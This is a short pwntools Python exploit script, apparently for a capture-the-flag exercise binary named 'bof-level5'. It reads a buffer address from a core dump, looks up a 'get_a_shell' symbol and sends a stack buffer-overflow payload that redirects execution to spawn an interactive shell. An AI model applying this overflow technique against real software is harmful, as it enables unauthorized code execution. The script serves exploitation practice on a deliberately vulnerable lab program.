#!/usr/bin/env python

from pwn import *

buf = "A" * 0x84

#DUMP CORE

#p = process("./bof-levelx")

#p.recv()

# Instead, just run the program to get core...
#if os.path.exists('core'):
#        p.sendline(buf)
#        p.wait()

c = Core('./core')

buffer_address = c.stack.find(buf)
print("Buffer Address:", hex(buffer_address))

e = ELF('./bof-levelx')
get_a_shell_address = e.symbols['get_a_shell']


#RUN EXPLOIT

p = process("./bof-level5")

p.sendline("AAAA" + p32(get_a_shell_address) + "B" * (0x80 - 8) + p32(buffer_address))

p.interactive()
